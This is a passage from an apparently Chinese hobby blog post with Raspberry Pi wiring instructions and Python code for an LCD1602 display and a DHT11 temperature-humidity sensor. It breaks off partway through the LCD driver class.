title=\"组件\"></a>组件</h1><ul>\n<li>python-dev</li>\n<li>python-rpi.gpio<br>如果不具备以上，请执行：<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get install python-dev</div><div class=\"line\">sudo apt-get install python-rpi.gpio</div></pre></td></tr></table></figure>\n</li>\n</ul>\n<h1 id=\"接线\"><a href=\"#接线\" class=\"headerlink\" title=\"接线\"></a>接线</h1><p>我们一共要完成两个任务：</p>\n<ul>\n<li>1.连接LCD1602</li>\n<li>2.连接DHT11</li>\n</ul>\n<p>树莓派3B的GPIO图如下：</p>\n<p><img src=\"/content/images/2016/08/GPIO.png\" alt=\"\"></p>\n<h2 id=\"2K-电阻如何连接到电路\"><a href=\"#2K-电阻如何连接到电路\" class=\"headerlink\" title=\"2K 电阻如何连接到电路\"></a>2K 电阻如何连接到电路</h2><p>简单粗暴的方法就是把电阻两头连接到两个子-母杜邦线上，然后用绝缘胶布缠上，非常方便美观。</p>\n<h2 id=\"LCD1602-接线方案\"><a href=\"#LCD1602-接线方案\" class=\"headerlink\" title=\"LCD1602 接线方案\"></a>LCD1602 接线方案</h2><p>LCD 与 树莓派相连 方案图，2K电阻是我自行设计，如果有电位器最好放置电位器：<br><img src=\"/content/images/2016/08/LCD1602--.jpg\" alt=\"\"></p>\n<p>树莓派的USB端口朝下，电源线位置朝上方向摆放。<br>右端一共有40个引脚，每个引脚的PIN位置如上。</p>\n<p>VSS，接地，RPi PIN 6<br>VDD，接5V电源，PRi PIN 2<br>VO，液晶对比度调节，接1K 电阻，另一端相连接地，PIN 9<br>RS，寄存器选择，接GPIO 14，RPi PIN 8<br>RW，读写选择，接地，表示写模式，PRi PIN 6<br>E，使能信号，接GPIO 15，RPi PIN 10<br>D0，数据位0，4位工作模式下不用，不接<br>D1，数据位1，4位工作模式下不用，不接<br>D2，数据位2，4位工作模式下不用，不接<br>D3，数据位3，4位工作模式下不用，不接<br>D4，数据位4，接GPIO 17，RPi PIN 11<br>D5，数据位5，接GPIO 18，RPi PIN 12<br>D6，数据位6，接GPIO 27，RPi PIN 13<br>D7，数据位7，接GPIO 22，RPi PIN 15<br>A，液晶屏背光+，接5V，RPi PIN 4<br>K，液晶屏背光-，接地，RPi PIN 39</p>\n<p><strong>连接好后，务必要仔细检查是否连接正确，以防开机烧坏GPIO甚至树莓派。</strong></p>\n<p>建议在关机情况下接线，如果在开机情况下接线，VDD请最后连接。</p>\n<h2 id=\"LCD1602-开机测试\"><a href=\"#LCD1602-开机测试\" class=\"headerlink\" title=\"LCD1602 开机测试\"></a>LCD1602 开机测试</h2><p>接通电源线，默认情况下，如果连接正确：</p>\n<ul>\n<li>肯定没有爆炸</li>\n<li>会出现如下图的效果，证明你已经接线成功了<br><img src=\"/content/images/2016/08/1.jpg\" alt=\"\"></li>\n</ul>\n<h2 id=\"DHT11-接线方案\"><a href=\"#DHT11-接线方案\" class=\"headerlink\" title=\"DHT11 接线方案\"></a>DHT11 接线方案</h2><p>接线简单，主要是把数据传输到GPIO26上</p>\n<p>DHT11有3个脚，VCC，DATA，GND<br>VCC 接 3.3V PIN 01<br>DATA 接 GPIO26 PIN 37<br>GND 接地  PIN 09</p>\n<p>#代码<br>采用python语言编写，由于html对tab和空格的支持不好，复制容易产生编译问题，代码已经传到github</p>\n<p><a href=\"https://github.com/yfgeek/rpi-TmpHmdRuntime\">https://github.com/yfgeek/rpi-TmpHmdRuntime</a><br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div><div class=\"line\">140</div><div class=\"line\">141</div><div class=\"line\">142</div><div class=\"line\">143</div><div class=\"line\">144</div><div class=\"line\">145</div><div class=\"line\">146</div><div class=\"line\">147</div><div class=\"line\">148</div><div class=\"line\">149</div><div class=\"line\">150</div><div class=\"line\">151</div><div class=\"line\">152</div><div class=\"line\">153</div><div class=\"line\">154</div><div class=\"line\">155</div><div class=\"line\">156</div><div class=\"line\">157</div><div class=\"line\">158</div><div class=\"line\">159</div><div class=\"line\">160</div><div class=\"line\">161</div><div class=\"line\">162</div><div class=\"line\">163</div><div class=\"line\">164</div><div class=\"line\">165</div><div class=\"line\">166</div><div class=\"line\">167</div><div class=\"line\">168</div><div class=\"line\">169</div><div class=\"line\">170</div><div class=\"line\">171</div><div class=\"line\">172</div><div class=\"line\">173</div><div class=\"line\">174</div><div class=\"line\">175</div><div class=\"line\">176</div><div class=\"line\">177</div><div class=\"line\">178</div><div class=\"line\">179</div><div class=\"line\">180</div><div class=\"line\">181</div><div class=\"line\">182</div><div class=\"line\">183</div><div class=\"line\">184</div><div class=\"line\">185</div><div class=\"line\">186</div><div class=\"line\">187</div><div class=\"line\">188</div><div class=\"line\">189</div><div class=\"line\">190</div><div class=\"line\">191</div><div class=\"line\">192</div><div class=\"line\">193</div><div class=\"line\">194</div><div class=\"line\">195</div><div class=\"line\">196</div><div class=\"line\">197</div><div class=\"line\">198</div><div class=\"line\">199</div><div class=\"line\">200</div><div class=\"line\">201</div><div class=\"line\">202</div><div class=\"line\">203</div><div class=\"line\">204</div><div class=\"line\">205</div><div class=\"line\">206</div><div class=\"line\">207</div><div class=\"line\">208</div><div class=\"line\">209</div><div class=\"line\">210</div><div class=\"line\">211</div><div class=\"line\">212</div><div class=\"line\">213</div><div class=\"line\">214</div><div class=\"line\">215</div><div class=\"line\">216</div><div class=\"line\">217</div><div class=\"line\">218</div><div class=\"line\">219</div><div class=\"line\">220</div><div class=\"line\">221</div><div class=\"line\">222</div><div class=\"line\">223</div><div class=\"line\">224</div><div class=\"line\">225</div><div class=\"line\">226</div><div class=\"line\">227</div><div class=\"line\">228</div><div class=\"line\">229</div><div class=\"line\">230</div><div class=\"line\">231</div><div class=\"line\">232</div><div class=\"line\">233</div><div class=\"line\">234</div><div class=\"line\">235</div><div class=\"line\">236</div><div class=\"line\">237</div><div class=\"line\">238</div><div class=\"line\">239</div><div class=\"line\">240</div><div class=\"line\">241</div><div class=\"line\">242</div><div class=\"line\">243</div><div class=\"line\">244</div><div class=\"line\">245</div><div class=\"line\">246</div><div class=\"line\">247</div><div class=\"line\">248</div><div class=\"line\">249</div><div class=\"line\">250</div><div class=\"line\">251</div><div class=\"line\">252</div><div class=\"line\">253</div><div class=\"line\">254</div><div class=\"line\">255</div><div class=\"line\">256</div><div class=\"line\">257</div><div class=\"line\">258</div><div class=\"line\">259</div><div class=\"line\">260</div><div class=\"line\">261</div><div class=\"line\">262</div><div class=\"line\">263</div><div class=\"line\">264</div><div class=\"line\">265</div><div class=\"line\">266</div><div class=\"line\">267</div><div class=\"line\">268</div><div class=\"line\">269</div><div class=\"line\">270</div><div class=\"line\">271</div><div class=\"line\">272</div><div class=\"line\">273</div><div class=\"line\">274</div><div class=\"line\">275</div><div class=\"line\">276</div><div class=\"line\">277</div><div class=\"line\">278</div><div class=\"line\">279</div><div class=\"line\">280</div><div class=\"line\">281</div><div class=\"line\">282</div><div class=\"line\">283</div><div class=\"line\">284</div><div class=\"line\">285</div><div class=\"line\">286</div><div class=\"line\">287</div><div class=\"line\">288</div><div class=\"line\">289</div><div class=\"line\">290</div><div class=\"line\">291</div><div class=\"line\">292</div><div class=\"line\">293</div><div class=\"line\">294</div><div class=\"line\">295</div><div class=\"line\">296</div><div class=\"line\">297</div><div class=\"line\">298</div><div class=\"line\">299</div><div class=\"line\">300</div><div class=\"line\">301</div><div class=\"line\">302</div><div class=\"line\">303</div><div class=\"line\">304</div><div class=\"line\">305</div><div class=\"line\">306</div><div class=\"line\">307</div><div class=\"line\">308</div><div class=\"line\">309</div><div class=\"line\">310</div><div class=\"line\">311</div><div class=\"line\">312</div><div class=\"line\">313</div><div class=\"line\">314</div><div class=\"line\">315</div><div class=\"line\">316</div><div class=\"line\">317</div><div class=\"line\">318</div><div class=\"line\">319</div><div class=\"line\">320</div><div class=\"line\">321</div><div class=\"line\">322</div><div class=\"line\">323</div><div class=\"line\">324</div><div class=\"line\">325</div><div class=\"line\">326</div><div class=\"line\">327</div><div class=\"line\">328</div><div class=\"line\">329</div><div class=\"line\">330</div><div class=\"line\">331</div><div class=\"line\">332</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># based on code from hugozhu/CharLCD.py https://gist.github.com/hugozhu/6166527</span></div><div class=\"line\"><span class=\"comment\"># rewrite by ivan</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</div><div class=\"line\"><span class=\"keyword\">from</span> datetime <span class=\"keyword\">import</span> datetime</div><div class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</div><div class=\"line\"><span class=\"keyword\">import</span> commands,time</div><div class=\"line\"><span class=\"keyword\">import</span> RPi.GPIO <span class=\"keyword\">as</span> GPIO</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_tmp</span><span class=\"params\">()</span>:</span></div><div class=\"line\">  channel = <span class=\"number\">37</span></div><div class=\"line\">  data = []</div><div class=\"line\">  j = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\">  GPIO.setmode(GPIO.BOARD)</div><div class=\"line\"></div><div class=\"line\">  time.sleep(<span class=\"number\">1</span>)</div><div class=\"line\"></div><div class=\"line\">  GPIO.setup(channel, GPIO.OUT)</div><div class=\"line\">  GPIO.output(channel, GPIO.LOW)</div><div class=\"line\">  time.sleep(<span class=\"number\">0.5</span>)</div><div class=\"line\">  GPIO.output(channel, GPIO.HIGH)</div><div class=\"line\">  GPIO.setup(channel, GPIO.IN)</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">while</span> GPIO.input(channel) == GPIO.LOW:</div><div class=\"line\">    <span class=\"keyword\">continue</span></div><div class=\"line\">  <span class=\"keyword\">while</span> GPIO.input(channel) == GPIO.HIGH:</div><div class=\"line\">    <span class=\"keyword\">continue</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">while</span> j &lt; <span class=\"number\">40</span>:</div><div class=\"line\">    k = <span class=\"number\">0</span></div><div class=\"line\">    <span class=\"keyword\">while</span> GPIO.input(channel) == GPIO.LOW:</div><div class=\"line\">      <span class=\"keyword\">continue</span></div><div class=\"line\">    <span class=\"keyword\">while</span> GPIO.input(channel) == GPIO.HIGH:</div><div class=\"line\">      k += <span class=\"number\">1</span></div><div class=\"line\">      <span class=\"keyword\">if</span> k &gt; <span class=\"number\">100</span>:</div><div class=\"line\">        <span class=\"keyword\">break</span></div><div class=\"line\">    <span class=\"keyword\">if</span> k &lt; <span class=\"number\">8</span>:</div><div class=\"line\">      data.append(<span class=\"number\">0</span>)</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">      data.append(<span class=\"number\">1</span>)</div><div class=\"line\"></div><div class=\"line\">    j += <span class=\"number\">1</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">print</span> <span class=\"string\">\"sensor is working.\"</span></div><div class=\"line\">  <span class=\"keyword\">print</span> data</div><div class=\"line\"></div><div class=\"line\">  humidity_bit = data[<span class=\"number\">0</span>:<span class=\"number\">8</span>]</div><div class=\"line\">  humidity_point_bit = data[<span class=\"number\">8</span>:<span class=\"number\">16</span>]</div><div class=\"line\">  temperature_bit = data[<span class=\"number\">16</span>:<span class=\"number\">24</span>]</div><div class=\"line\">  temperature_point_bit = data[<span class=\"number\">24</span>:<span class=\"number\">32</span>]</div><div class=\"line\">  check_bit = data[<span class=\"number\">32</span>:<span class=\"number\">40</span>]</div><div class=\"line\"></div><div class=\"line\">  humidity = <span class=\"number\">0</span></div><div class=\"line\">  humidity_point = <span class=\"number\">0</span></div><div class=\"line\">  temperature = <span class=\"number\">0</span></div><div class=\"line\">  temperature_point = <span class=\"number\">0</span></div><div class=\"line\">  check = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</div><div class=\"line\">    humidity += humidity_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\">    humidity_point += humidity_point_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\">    temperature += temperature_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\">    temperature_point += temperature_point_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\">    check += check_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\"></div><div class=\"line\">  tmp = humidity + humidity_point + temperature + temperature_point</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">if</span> check == tmp:</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'temp:'</span> + str(temperature) + <span class=\"string\">' C \\nhumidity:'</span> + str(humidity) + <span class=\"string\">'%'</span></div><div class=\"line\">  <span class=\"keyword\">else</span>:</div><div class=\"line\">    get_tmp()</div><div class=\"line\"></div><div class=\"line\">  GPIO.cleanup()    </div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Adafruit_CharLCD</span>:</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># commands</span></div><div class=\"line\">    LCD_CLEARDISPLAY            = <span class=\"number\">0x01</span></div><div class=\"line\">    LCD_RETURNHOME                  = <span class=\"number\">0x02</span></div><div class=\"line\">    LCD_ENTRYMODESET            = <span class=\"number\">0x04</span></div><div class=\"line\">    LCD_DISPLAYCONTROL          = <span class=\"number\">0x08</span></div><div class=\"line\">    LCD_CURSORSHIFT             = <span class=\"number\">0x10</span></div><div class=\"line\">    LCD_FUNCTIONSET             = <span class=\"number\">0x20</span></div><div class=\"line\">    LCD_SETCGRAMADDR            = <span class=\"number\">0x40</span></div><div class=\"line\">    LCD_SETDDRAMADDR            = <span class=\"number\">0x80</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for display entry mode</span></div><div class=\"line\">    LCD_ENTRYRIGHT              = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_ENTRYLEFT               = <span class=\"number\">0x02</span></div><div class=\"line\">    LCD_ENTRYSHIFTINCREMENT     = <span class=\"number\">0x01</span></div><div class=\"line\">    LCD_ENTRYSHIFTDECREMENT     = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for display on/off control</span></div><div class=\"line\">    LCD_DISPLAYON               = <span class=\"number\">0x04</span></div><div class=\"line\">    LCD_DISPLAYOFF              = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_CURSORON                = <span class=\"number\">0x02</span></div><div class=\"line\">    LCD_CURSOROFF               = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_BLINKON                 = <span class=\"number\">0x01</span></div><div class=\"line\">    LCD_BLINKOFF                = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for display/cursor shift</span></div><div class=\"line\">    LCD_DISPLAYMOVE             = <span class=\"number\">0x08</span></div><div class=\"line\">    LCD_CURSORMOVE              = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for display/cursor shift</span></div><div class=\"line\">    LCD_DISPLAYMOVE             = <span class=\"number\">0x08</span></div><div class=\"line\">    LCD_CURSORMOVE              = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_MOVERIGHT               = <span class=\"number\">0x04</span></div><div class=\"line\">    LCD_MOVELEFT                = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for function set</span></div><div class=\"line\">    LCD_8BITMODE                = <span class=\"number\">0x10</span></div><div class=\"line\">    LCD_4BITMODE                = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_2LINE                   = <span class=\"number\">0x08</span></div><div class=\"line\">    LCD_1LINE                   = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_5x10DOTS                = <span class=\"number\">0x04</span></div><div class=\"line\">    LCD_5x8DOTS                 = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, pin_rs=<span class=\"number\">8</span>, pin_e=<span class=\"number\">10</span>, pins_db=[<span class=\"number\">11</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">15</span>], GPIO = None)</span>:</span></div><div class=\"line\">        <span class=\"comment\"># Emulate the old behavior of using RPi.GPIO if we haven't been given</span></div><div class=\"line\">        <span class=\"comment\"># an explicit GPIO interface to use</span></div><div class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> GPIO:</div><div class=\"line\">            <span class=\"keyword\">import</span> RPi.GPIO <span class=\"keyword\">as</span> GPIO</div><div class=\"line\">        GPIO.setwarnings(<span class=\"keyword\">False</span>)</div><div class=\"line\"></div><div class=\"line\">        self.GPIO = GPIO</div><div class=\"line\">        self.pin_rs = pin_rs</div><div class=\"line\">        self.pin_e = pin_e</div><div class=\"line\">        self.pins_db = pins_db</div><div class=\"line\"></div><div class=\"line\">        self.GPIO.setmode(GPIO.BOARD)</div><div class=\"line\">        self.GPIO.setup(self.pin_e, GPIO.OUT)</div><div class=\"line\">        self.GPIO.setup(self.pin_rs, GPIO.OUT)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> pin <span class=\"keyword\">in</span> self.pins_db:</div><div class=\"line\">            self.GPIO.setup(pin, GPIO.OUT)</div><div class=\"line\"></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x33</span>) <span class=\"comment\"># initialization</span></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x32</span>) <span class=\"comment\"># initialization</span></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x28</span>) <span class=\"comment\"># 2 line 5x7 matrix</span></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x0C</span>) <span class=\"comment\"># turn cursor off 0x0E to enable cursor</span></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x06</span>) <span class=\"comment\"># shift cursor right</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol = self.LCD_DISPLAYON | self.LCD_CURSOROFF | self.LCD_BLINKOFF</div><div class=\"line\"></div><div class=\"line\">        self.displayfunction = self.LCD_4BITMODE | self.LCD_1LINE | self.LCD_5x8DOTS</div><div class=\"line\">        self.displayfunction |= self.LCD_2LINE</div><div class=\"line\"></div><div class=\"line\">        <span class=\"string\">\"\"\" Initialize to default text direction (for romance languages) \"\"\"</span></div><div class=\"line\">        self.displaymode =  self.LCD_ENTRYLEFT | self.LCD_ENTRYSHIFTDECREMENT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode) <span class=\"comment\">#  set the entry mode</span></div><div class=\"line\"></div><div class=\"line\">        self.clear()</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">begin</span><span class=\"params\">(self, cols, lines)</span>:</span></div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">if</span> (lines &gt; <span class=\"number\">1</span>):</div><div class=\"line\">                self.numlines = lines</div><div class=\"line\">                self.displayfunction |= self.LCD_2LINE</div><div class=\"line\">                self.currline = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">home</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_RETURNHOME) <span class=\"comment\"># set cursor position to zero</span></div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">3000</span>) <span class=\"comment\"># this command takes a long time!</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">clear</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_CLEARDISPLAY) <span class=\"comment\"># command to clear display</span></div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">3000</span>)    <span class=\"comment\"># 3000 microsecond sleep, clearing the display takes a long time</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">setCursor</span><span class=\"params\">(self, col, row)</span>:</span></div><div class=\"line\"></div><div class=\"line\">        self.row_offsets = [ <span class=\"number\">0x00</span>, <span class=\"number\">0x40</span>, <span class=\"number\">0x14</span>, <span class=\"number\">0x54</span> ]</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">if</span> ( row &gt; self.numlines ): </div><div class=\"line\">                row = self.numlines - <span class=\"number\">1</span> <span class=\"comment\"># we count rows starting w/0</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_SETDDRAMADDR | (col + self.row_offsets[row]))</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noDisplay</span><span class=\"params\">(self)</span>:</span> </div><div class=\"line\">        <span class=\"string\">\"\"\" Turn the display off (quickly) \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol &amp;= ~self.LCD_DISPLAYON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">display</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Turn the display on (quickly) \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol |= self.LCD_DISPLAYON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noCursor</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Turns the underline cursor on/off \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol &amp;= ~self.LCD_CURSORON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">cursor</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Cursor On \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol |= self.LCD_CURSORON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noBlink</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Turn on and off the blinking cursor \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol &amp;= ~self.LCD_BLINKON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noBlink</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Turn on and off the blinking cursor \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol &amp;= ~self.LCD_BLINKON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">DisplayLeft</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" These commands scroll the display without changing the RAM \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVELEFT)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">scrollDisplayRight</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" These commands scroll the display without changing the RAM \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVERIGHT);</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leftToRight</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" This is for text that flows Left to Right \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaymode |= self.LCD_ENTRYLEFT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode);</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">rightToLeft</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" This is for text that flows Right to Left \"\"\"</span></div><div class=\"line\">        self.displaymode &amp;= ~self.LCD_ENTRYLEFT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">autoscroll</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" This will 'right justify' text from the cursor \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaymode |= self.LCD_ENTRYSHIFTINCREMENT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noAutoscroll</span><span 